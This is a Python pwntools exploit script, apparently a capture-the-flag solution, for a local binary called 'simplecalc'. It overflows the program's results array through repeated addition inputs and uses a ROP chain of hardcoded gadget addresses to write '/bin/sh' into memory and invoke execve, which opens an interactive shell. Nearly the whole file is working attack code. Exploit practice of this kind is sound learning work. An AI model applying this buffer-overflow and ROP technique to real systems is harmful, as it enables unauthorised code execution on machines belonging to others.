from pwn import *


target = process("./simplecalc")

gdb.attach(target, gdbscript = 'b *0x40154a')

pop_rax_gadget = 0x000000000044db34

pop_rdi_gadget = 0x0000000000401b73

pop_rsi_gadget = 0x0000000000401c87

pop_rdx_gadget = 0x0000000000437a85


#Mov anything from rdx to what what rax point to
mov_gadget = 0x000000000044526e

syscall_gadget = 0x0000000000400488

# Read write memory at 0x00000000006c1000

# Enough to overflow
target.recvuntil(b'calculations: ')
target.sendline(b"153")

# These two functions are what we will use to give input via addition
def addSingle(x):
  target.recvuntil(b"=> ")
  # Select addition
  target.sendline(b"1")
  # Constant num to fulfill addition requirments
  target.recvuntil(b"Integer x: ")
  target.sendline(b"100")
  target.recvuntil(b"Integer y: ")
  target.sendline(str(x - 100).encode('utf-8'))


# Write a full word
def add(z):
  # One half word at a time, in little endian order
  x = z & 0xffffffff
  y = ((z & 0xffffffff00000000) >> 32)
  addSingle(x)
  addSingle(y)

# 9 * 4 = 72 == 0x48
for i in range(9):
  # Null up to return pointer to avoid accidently freeing arbitrary memory when the results array is freed
  add(0x0)


#Start rop and override return
# pop empty mem addr in to raw
add(pop_rax_gadget)
add(0x6c1000)

# pop /bin/sh into rdx
add(pop_rdx_gadget)
add(0x0068732f6e69622f) # "/bin/sh" in hex

# execute mov to move string /bin/sh to memory
add(mov_gadget)

# Pop execve syscall into rax
add(pop_rax_gadget)
add(0x3b)

# Pop addr of /bin/sh into rdi
add(pop_rdi_gadget)
add(0x6c1000)

# pop 0 in rsi for null argv
add(pop_rsi_gadget)
add(0x0)

#pop 0 in rdx for null env
add(pop_rdx_gadget)
add(0x0)

# execute syscall
add(syscall_gadget)

#Choose branch with syscall
target.sendline(b"5")


target.interactive()